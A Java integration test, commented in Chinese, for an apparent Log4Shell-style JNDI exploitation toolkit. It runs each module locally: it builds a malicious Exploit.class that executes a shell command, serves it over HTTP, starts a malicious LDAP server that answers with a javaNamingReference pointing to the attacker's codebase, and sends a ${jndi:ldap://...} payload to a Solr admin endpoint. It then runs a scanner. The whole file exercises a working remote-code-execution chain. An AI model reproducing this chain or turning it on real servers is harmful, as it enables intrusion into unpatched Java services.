import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

/**
 * 功能测试
 *
 * 对全部 6 个模块做本地集成验证，无需靶机：
 *   T1 恶意类生成      —— 生成 Exploit.class 并校验 major version = 52
 *   T2 HTTP 服务器     —— GET /Exploit.class 返回 200 和字节内容
 *   T3 LDAP 协议实现   —— 模拟 LDAP 客户端走 bind → search → unbind，校验 BindResponse(0x61) 与 SearchResultEntry(0x64)，内容包含 javaNamingReference 等友好属性名
 *   T4 Payload 发送    —— 原始 Socket 发送带 ${jndi:...} 的 GET，确认特殊字符未被编码、请求原样送达
 *   T5 端点扫描        —— 对本地 HTTP 服务器执行扫描流程
 */
public class ToolTest {

    private static int passed = 0;
    private static int failed = 0;

    private static void check(String name, boolean ok) {
        System.out.println((ok ? "[PASS] " : "[FAIL] ") + name);
        if (ok) {
            passed++;
        } else {
            failed++;
        }
    }

    public static void main(String[] args) throws Exception {
        File work = Files.createTempDirectory("jtoolkit").toFile();
        System.out.println("work dir: " + work);
        System.out.println();

        // ---------- T1: 恶意类生成 ----------
        System.out.println("== T1 恶意类生成 ==");
        File cls = MaliciousClassGenerator.generate("touch /tmp/pwned_java_tool",
                work.getAbsolutePath());
        check("Exploit.class 已生成", cls.exists() && cls.length() > 0);
        check("major version = 52 (Java 8)",
                MaliciousClassGenerator.readMajorVersion(cls) == 52);
        System.out.println();

        // ---------- T2: HTTP 服务器 ----------
        System.out.println("== T2 HTTP 服务器 ==");
        HttpServer http = HttpFileServer.start(work.getAbsolutePath(), 18888);
        Thread.sleep(300);
        String resp = EndpointScanner.httpGet("127.0.0.1", 18888, "/Exploit.class", 3000);
        check("GET /Exploit.class -> 200", resp.startsWith("HTTP/1.1 200"));
        check("响应包含类内容", resp.contains("Exploit"));
        String notFound = EndpointScanner.httpGet("127.0.0.1", 18888, "/nope.class", 3000);
        check("未知路径 -> 404", notFound.startsWith("HTTP/1.1 404"));
        System.out.println();

        // ---------- T3: LDAP 协议实现 ----------
        System.out.println("== T3 LDAP 协议实现 ==");
        java.net.ServerSocket ldapSrv =
                MaliciousLDAPServer.start(11389, "http://127.0.0.1:18888/", "Exploit");
        Thread.sleep(300);
        try (Socket s = new Socket("127.0.0.1", 11389)) {
            s.setSoTimeout(3000);
            InputStream in = s.getInputStream();
            OutputStream out = s.getOutputStream();

            // 模拟 LDAP 客户端：bind 请求（版本3 + 空 DN + 空密码）
            out.write(MaliciousLDAPServer.ldapMessage(1, new byte[]{
                    0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, (byte) 0x80, 0x00}));
            out.flush();
            byte[] bindResp = MaliciousLDAPServer.readMessage(in);
            check("BindRequest -> BindResponse(0x61)",
                    bindResp != null
                            && MaliciousLDAPServer.parseOpTag(bindResp) == 0x61);
            check("BindResponse resultCode = 0 (success)",
                    bindResp != null && bindResp.length > 9 && bindResp[9] == 0x00);

            // 模拟 LDAP 客户端：search 请求（base=cn=Exploit，返回全部属性）
            byte[] dn = new byte[]{(byte) 0x04, 0x0A};
            byte[] searchBody = new byte[]{
                    0x0A, 0x01, 0x02,          // scope = wholeSubtree
                    0x0A, 0x01, 0x00,          // derefAliases
                    0x02, 0x01, 0x00,          // sizeLimit = 0
                    0x02, 0x01, 0x00,          // timeLimit = 0
                    0x01, 0x01, 0x00,          // typesOnly = false
                    (byte) 0xA0, 0x00,         // filter = and{ }
                    0x30, 0x00};               // attributes = 全部
            ByteArrayOutputStream sb = new ByteArrayOutputStream();
            sb.write(0x63);                    // SearchRequest
            sb.write(dn);
            sb.write("cn=Exploit".getBytes(StandardCharsets.UTF_8));
            sb.write(searchBody);
            byte[] searchReq = sb.toByteArray();
            out.write(MaliciousLDAPServer.ldapMessage(2, searchReq));
            out.flush();

            byte[] entry = MaliciousLDAPServer.readMessage(in);
            String entryText = entry == null ? "" : new String(entry, StandardCharsets.ISO_8859_1);
            check("SearchRequest -> SearchResultEntry(0x64)",
                    entry != null && MaliciousLDAPServer.parseOpTag(entry) == 0x64);
            check("Entry 含 objectClass=javaNamingReference",
                    entryText.contains("javaNamingReference"));
            check("Entry 含 javaClassName=Exploit", entryText.contains("javaClassName"));
            check("Entry 含 javaCodeBase 指向攻击机",
                    entryText.contains("http://127.0.0.1:18888/"));

            byte[] done = MaliciousLDAPServer.readMessage(in);
            check("SearchResultDone(0x65) 三字段齐全",
                    done != null && MaliciousLDAPServer.parseOpTag(done) == 0x65
                            && done.length >= 9);

            // unbind 并关闭
            out.write(MaliciousLDAPServer.ldapMessage(3, new byte[]{0x42, 0x00}));
            out.flush();
        }
        System.out.println();

        // ---------- T4: Payload 发送 ----------
        System.out.println("== T4 Payload 发送 ==");
        String status = PayloadSender.send("127.0.0.1", 18888,
                "ldap://127.0.0.1:11389/cn=Exploit", "/solr/admin/cores");
        check("请求成功送达（HTTP 服务器收到响应）", status.startsWith("HTTP/1.1"));
        System.out.println();

        // ---------- T5: 端点扫描 ----------
        System.out.println("== T5 端点扫描 ==");
        EndpointScanner.scan("127.0.0.1", 18888);
        System.out.println();

        // ---------- 汇总 ----------
        ldapSrv.close();                 // 停止 LDAP 服务（非 daemon 线程）
        http.stop(0);                    // 停止 HTTP 服务，JVM 能正常退出
        System.out.println("========================");
        System.out.println("passed=" + passed + " failed=" + failed);
        System.exit(failed > 0 ? 1 : 0);   // 服务线程停止
    }
}
